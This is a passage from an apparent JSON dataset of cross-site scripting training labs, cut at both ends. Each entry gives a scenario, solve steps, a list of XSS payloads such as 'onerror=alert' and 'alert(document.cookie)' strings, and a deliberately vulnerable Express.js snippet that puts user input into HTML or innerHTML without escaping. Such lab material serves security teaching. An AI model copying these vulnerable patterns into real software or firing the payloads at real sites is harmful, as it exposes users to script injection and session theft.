      "<img src=x onerror=alert(1)>.jpg",
      "<script>alert(1)</script>.txt",
      "<svg/onload=alert(1)>.png",
      "<iframe src='javascript:alert(1)'></iframe>.doc"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const multer = require('multer'); const upload = multer({ dest: 'uploads/' }); const app = express(); const files = []; app.post('/upload', upload.single('file'), (req, res) => { files.push(req.file.originalname); res.redirect('/files'); }); app.get('/files', (req, res) => { const list = files.map(f => `<li>${f}</li>`).join(''); res.send(`<html><body><ul>${list}</ul></body></html>`); }); app.listen(3000);"
  },
  {
    "Lab scenario": "Bug Tracker XSS in Issue Description Field",
    "Lab Description": "A bug tracker application allows users to report issues. Issue descriptions are rendered using innerHTML when browsing the list of open tickets. Improper handling allows attackers to inject scripts into the description. To solve: Create a bug report with a malicious description and visit the issue list.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit an issue with a crafted XSS payload in the description.",
      "Visit the issue list page.",
      "Review DOM rendering of issue data.",
      "Trigger and confirm XSS execution."
    ],
    "payloads": [
      "<script>alert('bug')</script>",
      "<img src=x onerror=alert(1)>",
      "<svg/onload=alert('XSS')>",
      "<iframe src='javascript:alert(1)'></iframe>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const app = express(); const issues = []; app.use(express.urlencoded({ extended: true })); app.post('/report', (req, res) => { issues.push(req.body.description); res.redirect('/issues'); }); app.get('/issues', (req, res) => { const list = issues.map(i => `<p>${i}</p>`).join(''); res.send(`<html><body>${list}</body></html>`); }); app.listen(3000);"
  },
  {
    "Lab scenario": "Customer Support Portal XSS in Ticket Notes",
    "Lab Description": "Support agents can add internal notes to customer tickets, which are rendered with innerHTML when viewed later. The input form allows arbitrary HTML, leading to stored XSS. To solve: Inject a script into a ticket note and revisit it to trigger execution.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Login as a support agent and submit a note with an XSS payload.",
      "Open the corresponding ticket in the support interface.",
      "Observe how the note is rendered in the DOM.",
      "Trigger the XSS payload.",
      "Confirm the script runs in the support portal context."
    ],
    "payloads": [
      "<script>alert('support')</script>",
      "<img src=x onerror=alert(1)>",
      "<svg/onload=alert('XSS')>",
      "<iframe src='javascript:alert(1)'></iframe>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const app = express(); const notes = {}; app.use(express.urlencoded({ extended: true })); app.post('/add-note', (req, res) => { notes[req.body.ticket] = req.body.note; res.redirect('/ticket?ticket=' + req.body.ticket); }); app.get('/ticket', (req, res) => { const note = notes[req.query.ticket] || ''; res.send(`<html><body><div id='note'></div><script>document.getElementById('note').innerHTML = '${note}';</script></body></html>`); }); app.listen(3000);"
  },
  {
    "Lab scenario": "Job Board Platform XSS in Company Name Field",
    "Lab Description": "A job board lets recruiters post job listings with a company name field. The listings are displayed using innerHTML without input sanitization. The application trusts the company name input. To solve: Inject a payload into the company name and view the listing to trigger execution.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Create a job listing with an XSS payload in the company name field.",
      "Access the job board listings page.",
      "Observe unsafe rendering of company name via innerHTML.",
      "Trigger the XSS payload on listing view.",
      "Confirm script execution in browser."
    ],
    "payloads": [
      "<img src=x onerror=alert(1)>",
      "<script>alert('job')</script>",
      "<svg/onload=alert(1)>",
      "<iframe src='javascript:alert(1)'></iframe>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const app = express(); const jobs = []; app.use(express.urlencoded({ extended: true })); app.post('/post-job', (req, res) => { jobs.push(req.body.company); res.redirect('/jobs'); }); app.get('/jobs', (req, res) => { const list = jobs.map(c => `<div>${c}</div>`).join(''); res.send(`<html><body>${list}</body></html>`); }); app.listen(3000);"
  },
  {
    "Lab scenario": "E-commerce Review System XSS in Review Content",
    "Lab Description": "An online store allows users to post reviews on products. The review content is displayed via innerHTML in product pages without escaping special characters. Attackers can exploit this to run arbitrary scripts. To solve: Submit a crafted review and trigger execution on the product page.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Post a product review containing a malicious script.",
      "Navigate to the product details page.",
      "Review is rendered via innerHTML into the page DOM.",
      "Trigger and verify XSS execution.",
      "Validate that the payload executes in product page context."
    ],
    "payloads": [
      "<script>alert('review')</script>",
      "<img src=x onerror=alert(1)>",
      "<svg/onload=alert('XSS')>",
      "<iframe src='javascript:alert(1)'></iframe>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const app = express(); const reviews = []; app.use(express.urlencoded({ extended: true })); app.post('/submit-review', (req, res) => { reviews.push(req.body.review); res.redirect('/product'); }); app.get('/product', (req, res) => { const list = reviews.map(r => `<p>${r}</p>`).join(''); res.send(`<html><body>${list}</body></html>`); }); app.listen(3000);"
  },
  {
    "Lab scenario": "Support Chat Application XSS in Message Body",
    "Lab Description": "A live support chat displays incoming messages in real-time by appending message content via innerHTML. Inputs are not sanitized before rendering. Malicious users can send messages containing scripts. To solve: Send a crafted message to support and confirm script execution in agent's browser.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Send a message with an XSS payload to the support interface.",
      "Access the support panel as an agent.",
      "Chat messages are rendered using innerHTML.",
      "Trigger XSS payload from attacker-controlled message.",
      "Confirm execution of JavaScript."
    ],
    "payloads": [
      "<script>alert('chat')</script>",
      "<img src=x onerror=alert(1)>",
      "<svg/onload=alert(1)>",
      "<iframe src='javascript:alert(1)'></iframe>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const app = express(); const messages = []; app.use(express.urlencoded({ extended: true })); app.post('/send', (req, res) => { messages.push(req.body.message); res.redirect('/chat'); }); app.get('/chat', (req, res) => { const chat = messages.map(m => `<div>${m}</div>`).join(''); res.send(`<html><body>${chat}</body></html>`); }); app.listen(3000);"
  },
  {
    "Lab scenario": "Travel Blog XSS in Comment Field",
    "Lab Description": "Users can comment on blog posts in a travel site. The comment is displayed with innerHTML and stored unsanitized. An attacker can inject scripts that execute when comments are viewed. To solve: Submit a comment containing XSS and visit the blog to trigger it.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Navigate to a blog post and submit a comment with an XSS payload.",
      "Visit the blog post page as a viewer.",
      "Confirm the comment is rendered via innerHTML.",
      "Trigger the script execution.",
      "Validate the XSS occurs within the blog context."
    ],
    "payloads": [
      "<script>alert('travel')</script>",
      "<img src=x onerror=alert(1)>",
      "<svg/onload=alert('XSS')>",
      "<iframe src='javascript:alert(1)'></iframe>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const app = express(); const comments = []; app.use(express.urlencoded({ extended: true })); app.post('/comment', (req, res) => { comments.push(req.body.comment); res.redirect('/blog'); }); app.get('/blog', (req, res) => { const list = comments.map(c => `<p>${c}</p>`).join(''); res.send(`<html><body>${list}</body></html>`); }); app.listen(3000);"
  },
  {
    "Lab scenario": "Music Sharing Site XSS in Playlist Name",
    "Lab Description": "A music-sharing app allows users to create playlists. Playlist names are displayed using innerHTML on the main dashboard. No input sanitization is applied to the names. Attackers can use this to inject scripts. To solve: Create a malicious playlist name and view it on the dashboard.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Create a new playlist with a JavaScript payload as the name.",
      "Access the music dashboard page.",
      "Playlist name is rendered using innerHTML.",
      "Trigger and verify XSS payload execution.",
      "Confirm JavaScript runs in the app context."
    ],
    "payloads": [
      "<script>alert('playlist')</script>",
      "<img src=x onerror=alert(1)>",
      "<svg/onload=alert('XSS')>",
      "<iframe src='javascript:alert(1)'></iframe>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const app = express(); const playlists = []; app.use(express.urlencoded({ extended: true })); app.post('/create', (req, res) => { playlists.push(req.body.name); res.redirect('/dashboard'); }); app.get('/dashboard', (req, res) => { const list = playlists.map(p => `<li>${p}</li>`).join(''); res.send(`<html><body><ul>${list}</ul></body></html>`); }); app.listen(3000);"
  },
  {
    "Lab scenario": "Fitness Tracker App XSS in Goal Title",
    "Lab Description": "A fitness tracker allows users to set custom goals with a title. The title is displayed on the user's dashboard using innerHTML without sanitization. The application reflects the goal title directly. To solve: Inject a script into a goal title and trigger it on the dashboard.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Set a fitness goal with an XSS payload in the title field.",
      "Visit the dashboard to view active goals.",
      "Observe that the title is rendered using innerHTML.",
      "Trigger the payload when the dashboard loads.",
      "Confirm script execution in user context."
    ],
    "payloads": [
      "<script>alert('goal')</script>",
      "<img src=x onerror=alert(1)>",
      "<svg/onload=alert(1)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const app = express(); const goals = []; app.use(express.urlencoded({ extended: true })); app.post('/add-goal', (req, res) => { goals.push(req.body.title); res.redirect('/dashboard'); }); app.get('/dashboard', (req, res) => { const html = goals.map(g => `<div>${g}</div>`).join(''); res.send(`<html><body>${html}</body></html>`); }); app.listen(3000);"
  },
  {
    "Lab scenario": "Movie Review Site XSS in Reviewer Name",
    "Lab Description": "A movie site displays reviews and includes the reviewer's name using innerHTML. The name field is not sanitized, and malicious input is rendered into the DOM. To solve: Submit a crafted reviewer name and view the reviews page to execute JavaScript.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Submit a movie review with an XSS payload in the reviewer name field.",
      "Navigate to the reviews page.",
      "Observe unsanitized rendering using innerHTML.",
      "Trigger the injected script.",
      "Validate the XSS payload executes in page context."
    ],
    "payloads": [
      "<script>alert('reviewer')</script>",
      "<img src=x onerror=alert('XSS')>",
      "<svg/onload=alert(1)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const app = express(); const reviews = []; app.use(express.urlencoded({ extended: true })); app.post('/submit-review', (req, res) => { reviews.push(req.body.name); res.redirect('/reviews'); }); app.get('/reviews', (req, res) => { const html = reviews.map(n => `<p>${n}</p>`).join(''); res.send(`<html><body>${html}</body></html>`); }); app.listen(3000);"
  },
  {
    "Lab scenario": "Education Portal XSS in Assignment Title",
    "Lab Description": "Teachers can post assignments with a title that is shown to students via innerHTML. The title field is not escaped or sanitized. This allows a teacher or attacker to inject scripts. To solve: Create an assignment with a payload in the title and view it as a student.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Login as a teacher and post a new assignment with a payload in the title.",
      "Access the assignments page as a student.",
      "Assignment titles are rendered using innerHTML.",
      "XSS payload is triggered in student's browser.",
      "Confirm JavaScript execution in student context."
    ],
    "payloads": [
      "<script>alert('assignment')</script>",
      "<img src=x onerror=alert(1)>",
      "<svg/onload=alert(1)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const app = express(); const assignments = []; app.use(express.urlencoded({ extended: true })); app.post('/post-assignment', (req, res) => { assignments.push(req.body.title); res.redirect('/assignments'); }); app.get('/assignments', (req, res) => { const html = assignments.map(a => `<div>${a}</div>`).join(''); res.send(`<html><body>${html}</body></html>`); }); app.listen(3000);"
  },
  {
    "Lab scenario": "Developer Forum XSS in Thread Title",
    "Lab Description": "A coding forum allows users to create discussion threads with a title. The title is displayed on the homepage using innerHTML. No sanitization is done on input. To solve: Inject a payload into a thread title and verify execution when browsing the forum.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Create a thread with an XSS payload in the title.",
      "Access the forum home page.",
      "Thread titles are rendered via innerHTML.",
      "Trigger XSS payload upon page load.",
      "Verify script runs in forum context."
    ],
    "payloads": [
      "<script>alert('forum')</script>",
      "<img src=x onerror=alert(1)>",
      "<svg/onload=alert('XSS')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const app = express(); const threads = []; app.use(express.urlencoded({ extended: true })); app.post('/new-thread', (req, res) => { threads.push(req.body.title); res.redirect('/forum'); }); app.get('/forum', (req, res) => { const html = threads.map(t => `<h3>${t}</h3>`).join(''); res.send(`<html><body>${html}</body></html>`); }); app.listen(3000);"
  },
  {
    "Lab scenario": "Photography Sharing Site XSS in Album Description",
    "Lab Description": "A photo-sharing site allows users to add a description to their albums. The description is shown using innerHTML on the album page. Input is not sanitized, allowing XSS. To solve: Submit a malicious description and trigger the payload by visiting the album.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Create a photo album with an XSS payload in the description.",
      "Navigate to the album view page.",
      "Album description is rendered using innerHTML.",
      "Script executes in viewer's browser.",
      "Confirm JavaScript injection is successful."
    ],
    "payloads": [
      "<script>alert('photo')</script>",
      "<img src=x onerror=alert('XSS')>",
      "<svg/onload=alert(1)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const app = express(); const albums = []; app.use(express.urlencoded({ extended: true })); app.post('/create-album', (req, res) => { albums.push(req.body.description); res.redirect('/albums'); }); app.get('/albums', (req, res) => { const html = albums.map(a => `<div>${a}</div>`).join(''); res.send(`<html><body>${html}</body></html>`); }); app.listen(3000);"
  },
  {
    "Lab scenario": "E-Commerce Platform XSS in Wishlist Item Name",
    "Lab Description": "An e-commerce site allows users to add custom item names to their wishlist. These names are rendered using innerHTML on the wishlist page without sanitization. The application does not validate HTML/JS input. To solve: Inject a script payload into the item name and trigger it via the wishlist display.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Add a new wishlist item with an XSS payload in the name field.",
      "Visit the wishlist page to view stored items.",
      "Item names are rendered using innerHTML.",
      "Payload triggers automatically when page loads.",
      "Confirm script execution in the session context."
    ],
    "payloads": [
      "<script>alert('wishlist')</script>",
      "<img src=x onerror=alert(1)>",
      "<svg/onload=alert(1)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const app = express(); const items = []; app.use(express.urlencoded({ extended: true })); app.post('/add-item', (req, res) => { items.push(req.body.name); res.redirect('/wishlist'); }); app.get('/wishlist', (req, res) => { const html = items.map(i => `<li>${i}</li>`).join(''); res.send(`<html><body><ul>${html}</ul></body></html>`); }); app.listen(3000);"
  },
  {
    "Lab scenario": "Social Media App XSS in Bio Field",
    "Lab Description": "A social media platform allows users to update their bio. This bio is reflected on the user's public profile page using innerHTML without escaping tags. Malicious scripts can be embedded and executed. To solve: Inject a payload into the bio and trigger it on the profile page.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Update your profile with an XSS payload in the bio field.",
      "Visit your public profile page.",
      "Bio is rendered using innerHTML in the HTML response.",
      "Script executes upon rendering the profile.",
      "Confirm execution of the payload in page context."
    ],
    "payloads": [
      "<script>alert('bio')</script>",
      "<img src=x onerror=alert(1)>",
      "<svg/onload=alert('XSS')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const app = express(); let bio = ''; app.use(express.urlencoded({ extended: true })); app.post('/update-bio', (req, res) => { bio = req.body.bio; res.redirect('/profile'); }); app.get('/profile', (req, res) => { res.send(`<html><body><div>${bio}</div></body></html>`); }); app.listen(3000);"
  },
  {
    "Lab scenario": "Travel Booking Portal XSS in Destination Notes",
    "Lab Description": "A travel app lets users add 'notes' for destinations they plan to visit. These notes are shown on a trip summary page using innerHTML. No escaping is applied, allowing JavaScript injection. To solve: Add an XSS payload to a note and access the summary page.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit a trip note with a payload as the content.",
      "Navigate to the trip summary page.",
      "Note is rendered using innerHTML.",
      "Payload is triggered when the summary loads.",
      "Validate that script executes in user\u00e2\u20ac\u2122s context."
    ],
    "payloads": [
      "<script>alert('trip')</script>",
      "<img src=x onerror=alert('XSS')>",
      "<svg/onload=alert(1)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const app = express(); const notes = []; app.use(express.urlencoded({ extended: true })); app.post('/add-note', (req, res) => { notes.push(req.body.note); res.redirect('/trip-summary'); }); app.get('/trip-summary', (req, res) => { const html = notes.map(n => `<p>${n}</p>`).join(''); res.send(`<html><body>${html}</body></html>`); }); app.listen(3000);"
  },
  {
    "Lab scenario": "Food Delivery App XSS in Feedback Comments",
    "Lab Description": "Customers submit feedback with optional comments. These are displayed to admins using innerHTML. Since comments are not sanitized, a malicious user can inject JavaScript. To solve: Inject an XSS payload in the comment and trigger it in the admin interface.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Submit a feedback form with a crafted script in the comment field.",
      "Access the admin dashboard as an admin user.",
      "Comment is rendered in a feedback log via innerHTML.",
      "Script executes automatically in the admin\u00e2\u20ac\u2122s browser.",
      "Confirm access to admin context."
    ],
    "payloads": [
      "<script>alert('admin')</script>",
      "<img src=x onerror=alert('XSS')>",
      "<svg/onload=alert(1)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const app = express(); const feedbacks = []; app.use(express.urlencoded({ extended: true })); app.post('/submit-feedback', (req, res) => { feedbacks.push(req.body.comment); res.redirect('/thank-you'); }); app.get('/admin-feedback', (req, res) => { const html = feedbacks.map(f => `<div>${f}</div>`).join(''); res.send(`<html><body>${html}</body></html>`); }); app.listen(3000);"
  },
  {
    "Lab scenario": "Healthcare Portal XSS in Appointment Notes",
    "Lab Description": "Doctors can leave notes for each appointment. These notes are shown on the appointment review page using innerHTML. The application does not sanitize or encode user input. To solve: Insert a script payload into a doctor's note and execute it on the review page.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Add a note to a scheduled appointment with an XSS payload.",
      "Access the appointment review page.",
      "The note is injected using innerHTML without encoding.",
      "Payload is triggered in the browser.",
      "Verify the JavaScript executes successfully."
    ],
    "payloads": [
      "<script>alert('appointment')</script>",
      "<img src=x onerror=alert(1)>",
      "<svg/onload=alert(1)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const app = express(); const notes = []; app.use(express.urlencoded({ extended: true })); app.post('/add-note', (req, res) => { notes.push(req.body.note); res.redirect('/review'); }); app.get('/review', (req, res) => { const html = notes.map(n => `<div>${n}</div>`).join(''); res.send(`<html><body>${html}</body></html>`); }); app.listen(3000);"
  },
  {
    "Lab scenario": "Product Customization XSS in E-Commerce Configurator",
    "Lab Description": "An e-commerce site allows users to customize products before adding them to the cart. Custom text (e.g., engraved message) is previewed live using innerHTML inside a product detail component. The preview renderer fails to sanitize user-supplied input, leading to DOM-based XSS. To solve: Inject malicious input via the customization field to execute arbitrary JavaScript in the preview.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Navigate to a customizable product page.",
      "Enter a crafted XSS payload into the engraving/customization input.",
      "Submit and trigger the live preview mechanism.",
      "Inspect how the user input is embedded directly into the DOM using innerHTML.",
      "Observe the JavaScript alert triggered through the malicious input."
    ],
    "payloads": [
      "<img src=x onerror=alert(1)>",
      "<svg onload=alert(1)>",
      "<script>alert('XSS')</script>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const app = express(); const bodyParser = require('body-parser'); app.use(bodyParser.urlencoded({ extended: true })); app.get('/product', (req, res) => { const preview = req.query.preview || 'Customize your product'; res.send(`<html><body><h1>Customize Product</h1><form method='GET'><input name='preview'><button type='submit'>Preview</button></form><div id='preview'></div><script>document.getElementById('preview').innerHTML = '${preview}';</script></body></html>`); }); app.listen(3000);"
  },
  {
    "Lab scenario": "XSS via Contact Info Display in Job Applicant Portal",
    "Lab Description": "A job portal allows applicants to preview how their submitted contact info will appear to recruiters. The application reflects submitted form values directly into a DOM container without encoding. To solve: Craft a malicious payload in the contact info form that leads to script execution when previewed.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Go to the application form and enter payloads in the contact info fields.",
      "Submit the form to reach the preview step.",
      "Inspect the preview feature where input is reflected into the DOM.",
      "Inject and refine payloads targeting unsafe innerHTML rendering.",
      "Observe successful JavaScript execution."
    ],
    "payloads": [
      "<iframe src=javascript:alert(1)>",
      "<video><source onerror=alert(1)>",
      "<object data='javascript:alert(1)'></object>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.get('/apply', (req, res) => { res.send(`<form method='POST'><input name='contact'><button type='submit'>Submit</button></form>`); }); app.post('/apply', (req, res) => { const contact = req.body.contact || ''; res.send(`<html><body><h2>Preview Contact</h2><div id='preview'></div><script>document.getElementById('preview').innerHTML = '${contact}';</script></body></html>`); }); app.listen(3000);"
  },
  {
    "Lab scenario": "XSS in Search Suggestions for Real Estate Listings",
    "Lab Description": "A real estate platform offers search suggestions as users type queries. The suggestions are dynamically inserted into the page without escaping, using string concatenation with innerHTML. To solve: Inject a payload via search input that executes JavaScript when the suggestion dropdown renders.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Open the property search interface.",
      "Type a malicious payload in the search bar.",
      "Observe the suggestions box auto-populating based on the search input.",
      "Inspect how the input is embedded into the suggestions list.",
      "Trigger and verify script execution via XSS."
    ],
    "payloads": [
      "<img src=1 onerror=alert('XSS')>",
      "<svg/onload=alert('XSS')>",
      "<script>alert('XSS')</script>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const app = express(); app.get('/search', (req, res) => { const q = req.query.q || ''; res.send(`<html><body><form><input name='q'></form><div id='suggestions'></div><script>let input = '${q}'; document.getElementById('suggestions').innerHTML = '<ul><li>' + input + '</li></ul>';</script></body></html>`); }); app.listen(3000);"
  },
  {
    "Lab scenario": "XSS via Custom Notification Templates in Admin Panel",
    "Lab Description": "An admin interface allows configuration of notification templates using custom text fields. The custom message is rendered directly into a preview area using innerHTML. Due to lack of sanitization, arbitrary HTML/JS can be injected. To solve: Exploit the preview system by crafting an XSS payload as the custom message.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Login to the admin panel and open the notification editor.",
      "Submit a crafted payload as part of the custom message field.",
      "Use the preview button to observe unsafe rendering.",
      "Inspect the JavaScript logic responsible for rendering innerHTML.",
      "Trigger and confirm JavaScript execution."
    ],
    "payloads": [
      "<img src=x onerror=alert('XSS')>",
      "<marquee onstart=alert(1)>test</marquee>",
      "<svg><script>alert('XSS')</script></svg>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.get('/admin', (req, res) => { res.send(`<form method='POST'><input name='msg'><button type='submit'>Preview</button></form>`); }); app.post('/admin', (req, res) => { const msg = req.body.msg || ''; res.send(`<html><body><h2>Notification Preview</h2><div id='notif'></div><script>document.getElementById('notif').innerHTML = '${msg}';</script></body></html>`); }); app.listen(3000);"
  },
  {
    "Lab scenario": "DOM XSS via Meta Description Injection in Blog CMS",
    "Lab Description": "A blog CMS allows post authors to add custom meta descriptions. These descriptions are inserted into the DOM using JavaScript after loading the post. Due to lack of escaping, this allows DOM-based XSS. To solve: Inject a payload in the meta description that leads to execution on page load.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Login as a blog author and create/edit a post.",
      "Insert a JavaScript payload into the meta description field.",
      "Save and view the blog post.",
      "Inspect the DOM insertion using innerHTML or document.write.",
      "Confirm script execution."
    ],
    "payloads": [
      "<script>alert('meta XSS')</script>",
      "<img src=x onerror=alert(1)>",
      "<svg onload=alert(1)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const app = express(); const bodyParser = require('body-parser'); app.use(bodyParser.urlencoded({ extended: true })); let description = ''; app.get('/new-post', (req, res) => { res.send(`<form method='POST'><input name='desc'><button type='submit'>Save</button></form>`); }); app.post('/new-post', (req, res) => { description = req.body.desc; res.redirect('/post'); }); app.get('/post', (req, res) => { res.send(`<html><body><h1>My Blog</h1><script>document.body.innerHTML += '${description}';</script></body></html>`); }); app.listen(3000);"
  },
  {
    "Lab scenario": "XSS in Personalized Finance News Feed",
    "Lab Description": "The financial application offers personalized news feeds based on user preferences. These preferences are reflected directly into the HTML without proper sanitization, allowing attackers to inject JavaScript into news headlines. To solve: Exploit the unsanitized headline rendering to execute arbitrary script when the page loads.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Access the /preferences endpoint and update the headline preference with an XSS payload.",
      "Refresh the /news-feed endpoint to trigger rendering based on the saved preference.",
      "Observe how the payload appears inside the <h2> tag or JavaScript block.",
      "Craft a working payload that fits the injection point in the DOM.",
      "Confirm that the script executes upon loading the feed."
    ],
    "payloads": [
      "<img src=x onerror=alert(1)>",
      "<svg/onload=alert('XSS')>",
      "<script>alert(document.domain)</script>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); let preference = 'Top News'; app.use(bodyParser.urlencoded({ extended: true })); app.get('/preferences', (req, res) => { res.send(`<form method='POST' action='/preferences'><input name='headline' value='${preference}'><button>Save</button></form>`); }); app.post('/preferences', (req, res) => { preference = req.body.headline; res.redirect('/news-feed'); }); app.get('/news-feed', (req, res) => { res.send(`<html><body><h2>${preference}</h2></body></html>`); }); app.listen(3000);"
  },
  {
    "Lab scenario": "Reflected XSS in OpenID Redirect Parameter",
    "Lab Description": "An OpenID login endpoint reflects the redirect URL back to the page during error handling. Improper validation of the redirect parameter leads to an XSS sink in a script context. To solve: Inject a payload into the redirect query string and trigger script execution during login failure.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Navigate to /auth?redirect= and inject an XSS payload as the redirect target.",
      "Cause a login failure to trigger the error message containing the redirect.",
      "Observe the reflected URL in the DOM or inside a <script> block.",
      "Use console or view-source to find injection context.",
      "Confirm that the crafted redirect results in alert execution."
    ],
    "payloads": [
      "\");alert(1);//",
      "';alert(document.cookie);//",
      "`;alert('XSS')//"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const app = express(); app.get('/auth', (req, res) => { const redirect = req.query.redirect || '/dashboard'; res.send(`<html><body><script>var err = 'Invalid login, returning to ${redirect}';</script></body></html>`); }); app.listen(3000);"
  },
  {
    "Lab scenario": "XSS in Avatar Preview Generator",
    "Lab Description": "Users can customize avatars using a generator that displays a live preview. The avatar preview is rendered with user-submitted data directly placed into an innerHTML attribute, making it vulnerable to DOM-based XSS. To solve: Inject a malicious payload in the avatar name field that results in script execution inside the preview box.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Go to /avatar-generator and submit a crafted avatar name.",
      "Review the live preview section and identify unsafe innerHTML injection.",
      "Inject payloads that break HTML structure to run scripts.",
      "Test both self-closing and non-closing tags.",
      "Confirm execution of JavaScript in the live preview section."
    ],
    "payloads": [
      "<img src=x onerror=alert(1)>",
      "<iframe src=javascript:alert('XSS')>",
      "<video><source onerror=alert('XSS')></video>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.get('/avatar-generator', (req, res) => { res.send(`<form method='POST'><input name='name'><button>Preview</button></form>`); }); app.post('/avatar-generator', (req, res) => { const name = req.body.name; res.send(`<div id='preview'><h3>Preview</h3><div>${name}</div></div>`); }); app.listen(3000);"
  },
  {
    "Lab scenario": "XSS via Bug Report Summary in Admin Panel",
    "Lab Description": "A bug tracker application allows users to submit bug reports. The admin panel renders submitted summaries into a table with no sanitization. This enables attackers to inject JavaScript payloads that execute when an admin opens the panel. To solve: Submit a bug report with a crafted summary field that executes a script on the /admin-bugs page.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Submit a bug report through /report with an XSS payload in the summary.",
      "Login as an admin and navigate to /admin-bugs.",
      "Observe the rendering of the payload in a table cell.",
      "Craft payloads using <script>, <img>, or <svg>.",
      "Confirm successful execution in the admin context."
    ],
    "payloads": [
      "<img src=x onerror=alert('Admin XSS')>",
      "<svg/onload=alert('XSS')>",
      "<script>alert('Bug')</script>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); const reports = []; app.use(bodyParser.urlencoded({ extended: true })); app.get('/report', (req, res) => { res.send(`<form method='POST'><input name='summary'><button>Submit</button></form>`); }); app.post('/report', (req, res) => { reports.push(req.body.summary); res.redirect('/thankyou'); }); app.get('/admin-bugs', (req, res) => { const rows = reports.map(r => `<tr><td>${r}</td></tr>`).join(''); res.send(`<table>${rows}</table>`); }); app.listen(3000);"
  },
  {
    "Lab scenario": "Stored XSS in Shared Task Description",
    "Lab Description": "A collaborative to-do app allows users to share task descriptions publicly. The application renders task descriptions in the shared view using dangerouslySetInnerHTML-style rendering without sanitization. To solve: Inject a stored XSS payload in a task and access the public share page to trigger it.",
    "Difficulty Level": "High",
    "Solution Steps": [
      "Create a task with a malicious description using HTML tags.",
      "Enable public sharing via /share endpoint.",
      "Navigate to the shared link to observe task rendering.",
      "Craft payloads using <script> or HTML-based vectors.",
      "Confirm that the payload executes when another user views the task."
    ],
    "payloads": [
      "<script>alert('Task XSS')</script>",
      "<object data='javascript:alert(1)'></object>",
      "<img src=x onerror=alert(1)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); const tasks = []; app.use(bodyParser.urlencoded({ extended: true })); app.post('/create-task', (req, res) => { tasks.push(req.body.description); res.redirect('/tasks'); }); app.get('/share', (req, res) => { const shared = tasks.map(t => `<li>${t}</li>`).join(''); res.send(`<ul>${shared}</ul>`); }); app.listen(3000);"
  },
  {
    "Lab scenario": "DOM XSS in Search Suggestion Tooltip",
    "Lab Description": "The application's search feature includes a tooltip showing the last searched term. The tooltip is updated using innerHTML directly from the URL parameter without proper encoding. To solve: Inject a payload via the `term` query string to trigger JavaScript execution when the tooltip renders.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Navigate to /search?term= with a test string to inspect rendering.",
